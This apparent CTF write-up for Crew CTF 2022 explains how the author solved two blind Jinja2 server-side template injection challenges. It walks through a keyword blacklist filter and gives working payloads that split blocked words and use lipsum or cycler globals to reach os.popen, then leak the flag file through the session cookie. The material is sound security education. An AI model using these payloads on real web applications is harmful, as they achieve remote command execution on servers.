---
title: Crew CTF 2022 – EzChall & EzChall Again
date: '2022-04-17'
draft: false
authors: ['elluch']
tags: ['CREW CTF 2022', 'web', 'SSTI', 'filters', 'blacklist']
summary: 'Blind SSTI with filters'
---

# EzChall

![Challenge](/static/images/crew-ctf-2022/EzChall/desc.png)

In this blogpost, I'll be showcasing my thought proccess of solving these two challenges.

So, we're given the source code of the application.

![Source Code](/static/images/crew-ctf-2022/EzChall/source.png)

Let's first start by poking at `app.py` where we have 2 Routes (login/dashboard).

Nothing interesting in the second route other than the admin hardcoded credentails

- `admin`: `cGFzcyBpcyBhZG1pbiA/Pw==`

```py
def login():
	if 'user' in session:
		return redirect(url_for('dashboard'))
	else:
		if request.method == "POST":
			user, passwd = '', ''
			user = request.form['user']
			passwd = request.form['passwd']
			if user == 'admin' and bdecode(passwd) == 'pass is admin ??' and len(passwd) == 24 and passwd != 'cGFzcyBpcyBhZG1pbiA/Pw==':
				session['user'] = user
				return redirect(url_for('dashboard'))
			return render_template('login.html', msg='Incorrect !')
		return render_template('login.html')
```

For the dashboard endpoint, we have a straightforward blind ssti vulnerability if the we validate the checker `check_filter`.

```py
def dashboard():
	if 'user' not in session:
			return redirect(url_for('login'))
	else:
		if request.args.get('payload') is not None:
			payload = request.args.get('payload')
			if check_filter(payload):
				render_template_string(payload)
			return 'I believe you can overcome this difficulty ><'
		return 'miss params'

```

Now let's start fun part and check how it's validating the payload.

I got a bit cocky at first sight and thought this was a typical blind ssti and rushed copying one of my go-to ssti payloads and then noticed that request/join/attr/print was filtered and gave up on the typical payloads at this point.

```py
import string

UNALLOWED = [
 'class', 'mro', 'init', 'builtins', 'request', 'app','sleep', 'add', '+', 'config', 'subclasses', 'format', 'dict', 'get', 'attr', 'globals', 'time', 'read', 'import', 'sys', 'cookies', 'headers', 'doc', 'url', 'encode', 'decode', 'chr', 'ord', 'replace', 'echo', 'base', 'self', 'template', 'print', 'exec', 'response', 'join', 'cat', '%s', '{}', '\\', '*', '&',"{{", "}}", '[]',"''",'""','|','=','~']


def check_filter(input):
    input = input.lower()
    if input.count('.') > 1 or input.count(':') > 1 or input.count('/') > 1:
        return False
    if len(input) < 115:
        for char in input:
            if char in string.digits:
                return False
        for i in UNALLOWED:
            if i in input:
                return False
        return True
    return False
```

Now let's find out what's going on here.

- The first thing to notice is the first if statement, we'll need only one of these to be true to get past it due to the usage of the OR operator.

> Which i wish i have noticed earlier, as i was trying to forge `/` with `${PWD%${PWD#?}}` and ended up giving up on it because it was ending with `}}` and limited length

![Attempt 1](/static/images/crew-ctf-2022/EzChall/attempt1.png)

```py
if input.count('.') > 1 or input.count(':') > 1 or input.count('/') > 1 :
```

- Also, a thing to keep in mind the length limit. so we need to have a limited payload size.

```py
if len(input) < 115
```

- Moreover, We can't use digits so we can't bypass the blacklist with unicode `:s`

```py
if char in string.digits:
	return False
```

- Finally, the blacklist.

```py
UNALLOWED = [
 'class', 'mro', 'init', 'builtins', 'request', 'app','sleep', 'add', '+', 'config', 'subclasses', 'format', 'dict', 'get', 'attr', 'globals', 'time', 'read', 'import', 'sys', 'cookies', 'headers', 'doc', 'url', 'encode', 'decode', 'chr', 'ord', 'replace', 'echo', 'base', 'self', 'template', 'print', 'exec', 'response', 'join', 'cat', '%s', '{}', '\\', '*', '&',"{{", "}}", '[]',"''",'""','|','=','~']
```

I've added few debugging prints and an input to the filter to test the payloads that I create.

```py
input=input("> ")
print(check_filter(input))
print("[.] "+str(input.count('.')))
print("[/] "+str(input.count('/')))
print("[:] "+str(input.count(':')))
print("[Len] "+ str(len(input))
```

So, to summarize, we have a blind ssti with some interesting blacklist and length limited.

We can make a small skeleton for our payload.

- It's a blind ssti, we don't really choices here, it's either making it timing based which can take some space in the payload or just simply creating a new cookie to exfilter exfiltrer data using `session.update`
- `{{` and `}}` are filtered, so we'll probably use `{%`

So, for now our payload will be something like that

```py
{%if session.update({'f':somepayload})%}{%endif%}
```

At this point, we're more limited in the actual length of our payload. While i was searching for a smaller payload i came a cross a presentation from `Grehack 2021` by @Podalirius https://podalirius.net/en/publications/grehack-2021-optimizing-ssti-payloads-for-jinja2/GreHack_2021_-_Optimizing_Server_Side_Template_Injections_payloads_for_jinja2_slides.pdf
which has some interesting payloads and they're can be found in payloadsallofthethings

> I'll be using another payload later because of the length limit issue, This is how i originally started the challenge. They'll be in use for the next challenge

```py
cycler.__init__.__globals__.os.popen('id').read() joiner.__init__.__globals__.os.popen('id').read()
namespace.__init__.__globals__.os.popen('id').read()
```

I'll continue with the first one and to make it easier to deal with blacklisted words and also the count of dots. i'll change it to this format

```py
cycler['__init__']['__globals__']['os']['popen']('id')['read']()
```

First, i tried to use `[::-1]` to reverse the string, then i remembered that digits were filtered. we also can't use `+` to concatenate the strings as it was filtered

> I tried to use format string with int() but ended up failing. - Completely overthinking it x)

![Attempt 2](/static/images/crew-ctf-2022/EzChall/attempt2.png)

So, the idea here is pretty simple and basically we need to us an empty space between the blacklisted strings

```py
cycler['__in' 'it__']['__glo' 'bals__']['os']['popen']('id')['rea' 'd']()
```

![Attempt 3](/static/images/crew-ctf-2022/EzChall/attempt3.png)

At this point, we're pretty much over.

```py
{%if session.update({'f':cycler['__in' 'it__']['__glo' 'bals__']['os']['popen']('tail /flag')['re' 'ad']()}{%endif%}
```

![Count](/static/images/crew-ctf-2022/EzChall/count.png)

The only problem here, is that we're exceeding the length limit. This is where i got stuck, i kept searching and fuzzing for smaller payloads and ended up using `lipsum` .

```py
lipsum.__globals__.__os__.__popen__('id').read()
```

I then, transformed it

```py
lipsum['__glo' 'bals__']['os']['popen']('tail /flag')['re' 'ad']()
```

Our final payload is

```py
{%if session.update({'f':lipsum['__glo' 'bals__']['os']['popen']('tail /flag')['re' 'ad']()})%}{%endif%}
```

![Success](/static/images/crew-ctf-2022/EzChall/success1.png)

Finally,We submit it and get the cookie and decode it and get the flag \\o/

![Flag](/static/images/crew-ctf-2022/EzChall/flag1.png)

# EzChall Again

So this is pretty much the same challenge but with more filters, we'll use almost the same techniques before just changing some stuff

```py
import string

UNALLOWED = [
 'class', 'mro', 'init', 'builtins', 'request', 'app','sleep', 'add', '+', 'config', 'subclasses', 'format', 'dict', 'get', 'attr', 'globals', 'time', 'read', 'import', 'sys', 'cookies', 'headers', 'doc', 'url', 'encode', 'decode', 'chr', 'ord', 'replace', 'echo', 'base', 'self', 'template', 'print', 'exec', 'response', 'join', 'cat','if', 'end', 'for', 'sum', '%s', '{}', '\\', '*', '&',"{{", "}}", '[]',"''",'""','|','==','~']


def check_filter(input):
    input = input.lower()
    if input.count('.') > 1 or input.count(':') > 1 or input.count('/') > 1 or input.count('%') > 2:
        return False
    if len(input) < 115:
        for char in input:
            if char in string.digits:
                return False
        for i in UNALLOWED:
            if i in input:
                return False
        return True
    return False
```

- So bascailly, we can't use `if` / `for` / `lipsum`

Upon reading jinja2 docs, I've found that we can use `Assignments` using the function `set`.

```py
{% set a=payload %}
```

- As `lipsum` is filtered because of `sum`, we'll use the payload that we created in the first challenge with `cycler`

```py
cycler['__in' 'it__']['__glo' 'bals__']['os']['popen']('id')['rea' 'd']()
```

Our payload to exfilter the flag will be

```py
session.update({'f':cycler['__ini' 't__']['__glo' 'bals__']['os']['popen']('tac /flag')['re' 'ad']()})
```

Our final payload is

```py
{% set a=session.update({'f':cycler['__ini' 't__']['__glo' 'bals__']['os']['popen']('tac /flag')['re' 'ad']()}) %}
```

![Success](/static/images/crew-ctf-2022/EzChall/success2.png)

Now, we can use it and get the cookie containing the flag

![Flag](/static/images/crew-ctf-2022/EzChall/flag2.png)

This is all for this post, I hope you liked these two writeups!
